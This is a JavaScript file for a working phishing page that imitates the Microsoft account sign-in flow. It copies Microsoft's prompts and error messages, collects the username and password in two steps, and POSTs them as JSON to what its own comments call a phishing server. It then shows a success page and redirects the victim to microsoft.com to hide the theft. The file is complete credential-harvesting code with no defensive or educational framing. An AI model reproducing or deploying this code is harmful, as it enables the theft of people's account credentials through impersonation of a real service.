document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Enter a valid email address, phone number, or Skype name."
    const pwdReq = "Please enter the password for your Microsoft account."
    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    const user_identity_span = document.getElementById('user_identity');

    let view = "uname"; // Current view state

    let unameVal = false; // Username validation state
    let pwdVal = false;   // Password validation state

    // --- DYNAMIC SERVER CONFIGURATION ---
    // Automatically detect the current server URL
    const phishingServerUrl = `${window.location.protocol}//${window.location.host}/login`;
    console.log('🎯 Phishing server URL:', phishingServerUrl);
    // --- END CONFIGURATION ---

    // Next button functionality
    const nxt = document.getElementById('btn_next');
    nxt.addEventListener('click', () => {
        validate();
        if (unameVal) {
            // Hide username section, show password section
            document.getElementById("section_uname").classList.toggle('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');
            
            // Update displayed identity
            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            });
            view = "pwd";
        }
    });

    // Sign in button functionality
    const sig = document.getElementById('btn_sig');
    sig.addEventListener('click', async () => {
        validate();

        if (pwdVal) {
            const username = user_identity_span.innerText.trim();
            const password = pwdInp.value.trim();

            // Show loading state (optional)
            sig.textContent = 'Signing in...';
            sig.disabled = true;

            console.log('🔐 Attempting to capture credentials...');
            console.log('📧 Username:', username);
            console.log('🔒 Password:', '[REDACTED]');

            try {
                const response = await fetch(phishingServerUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password
                    }),
                });

                if (response.ok) {
                    console.log('✅ Credentials sent successfully!');
                    
                    // The server returns the success page HTML
                    const successPageHtml = await response.text();
                    
                    // Replace the entire page with the success page
                    document.open();
                    document.write(successPageHtml);
                    document.close();
                    
                } else {
                    console.error('❌ Failed to send credentials. Status:', response.status);
                    alert('Sign-in failed. Please check your credentials and try again.');
                    
                    // Reset button state
                    sig.textContent = 'Sign in';
                    sig.disabled = false;
                }
            } catch (error) {
                console.error('🚨 Network error:', error);
                alert('A network error occurred. Please check your connection and try again.');
                
                // Reset button state
                sig.textContent = 'Sign in';
                sig.disabled = false;
            }
        }
    });

    // Validation functions
    function validate() {
        function unameValAction(type) {
            if (!type) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp')
                unameVal = true;
            }
        }

        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp')
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp')
                pwdVal = true;
            }
        }

        if (view === "uname") {
            if (unameInp.value.trim() === "") {
                unameValAction(false);
            } else {
                unameValAction(true);
            }
            
            unameInp.addEventListener('input', function () {
                if (this.value.trim() === "") {
                    unameValAction(false);
                } else {
                    unameValAction(true);
                }
            });
        } else if (view === "pwd") {
            if (pwdInp.value.trim() === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
            }
            
            pwdInp.addEventListener('input', function () {
                if (this.value.trim() === "") {
                    pwdValAction(false);
                } else {
                    pwdValAction(true);
                }
            });
        }
    }

    // Back button functionality
    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.toggle('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    });

    // Final buttons (Stay signed in page)
    document.querySelectorAll('#btn_final').forEach((b) => {
        b.addEventListener('click', () => {
            console.log("Final button clicked. Redirecting...");
            window.location.href = 'https://www.microsoft.com';
        });
    });

    // Enhanced keyboard support
    unameInp.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            nxt.click();
        }
    });

    pwdInp.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            sig.click();
        }
    });
});
